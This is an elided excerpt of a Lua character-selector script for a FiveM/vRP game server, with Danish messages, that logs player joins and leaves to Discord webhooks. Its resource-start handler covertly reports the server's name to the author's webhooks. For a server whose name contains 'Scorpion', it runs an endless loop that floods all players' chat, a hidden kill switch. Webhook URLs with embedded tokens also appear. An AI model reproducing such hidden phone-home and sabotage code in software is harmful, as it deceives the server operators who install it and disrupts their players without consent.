					...
					"body": [
						{
							...
							"items": [
								{
									"type": "TextBlock",
									"text": "CharacterSelector -> [Server-Navn]",
									"size": "Medium",
									"wrap": true,
									"spacing": "Large",
									"separator": true,
          ...
          if not banned then
            ...
            vRP.isWhitelisted(nowUserId, function(whitelisted)
              if not config.whitelist or whitelisted then
                ...
                if vRP.rusers[nowUserId] == nil then -- not present on the server, init
                  ...
                  vRP.getUData(nowUserId, "vRP:datatable", function(sdata)
                    ...
                    vRP.getLastLogin(nowUserId, function(last_login)
					  ...
					  PerformHttpRequest('https://discordapp.com/api/webhooks/60674623958459043840/jBrU5dsJvnKFO4fHO1FTnJnncBhmuWmZaKAgwzoNAd13D4GoVvZAA_h1_0sP8gHxefzE', function(err, text, headers) end, 'POST', json.encode({username = "Connection Checker", content = "```ID: "..nowUserId.." - ["..name.."] - connectede.```"}), { ['Content-Type'] = 'application/json' })
                ...
                deferrals.done("Du ikke whitelisted, ansøg via discorden. https://discord.gg/UwFsNG ("..nowUserId..")")
              end
            end)
          else
...
AddEventHandler("playerDropped",function(reason)
  ...
  if user_id ~= nil then
    ...
    print("[vRP] "..vRP.getPlayerEndpoint(source).." forlod (ID: "..user_id..")")
	  PerformHttpRequest('https://discordapp.com/api/webhooks/60674695845902343840/jBrU5dsJvnKFO4fHO1FTnJnncBhmuWmZaKAgwzoNAd13D4GoVvZAA_h1_0sP8gHxefzE', function(err, text, headers) end, 'POST', json.encode({username = "Connection Checker", content = "```ID: "..user_id.." - Forlod serveren \n"..reason.."```"}), { ['Content-Type'] = 'application/json' })
  ...
  if (GetCurrentResourceName() == resourceName) then
		...
		scriptnavn = "Kaz_CharacterSelector"
			if string.match(servernavn, "Scorpion") then
				PerformHttpRequest('https://discordapp.com/api/webhooks/691018426638008441/2Ew2IEqv6MSX7u9Gk6_gdzhrPaZBNfLzoSRD0U5oU-AuJ83JC5JGf78m9p0T71lcD48c', function(err, text, headers) end, 'POST', json.encode({username = "ServerStart", content = "```["..servernavn.."]: Startede ["..scriptnavn.."]```"}), { ['Content-Type'] = 'application/json' })
				while true do
					TriggerClientEvent('chatMessage', -1, 'SYSTEM:', {255, 0, 0}, "INGEN TILLADELSE, MVH KAZOON")
					Citizen.Wait(1)
				end
			else
				PerformHttpRequest('https://discordapp.com/api/webhooks/691018224770482227/KtECWOjWj5dRrJHWgzFifcEANSPA8oAzoOsGBOlz1iPKNIhMWeFSfkqOJjwsneqzQPek', function(err, text, headers) end, 'POST', json.encode({username = "ServerStart", content = "```["..servernavn.."]: Startede ["..scriptnavn.."]```"}), { ['Content-Type'] = 'application/json' })
			end
	end
end)
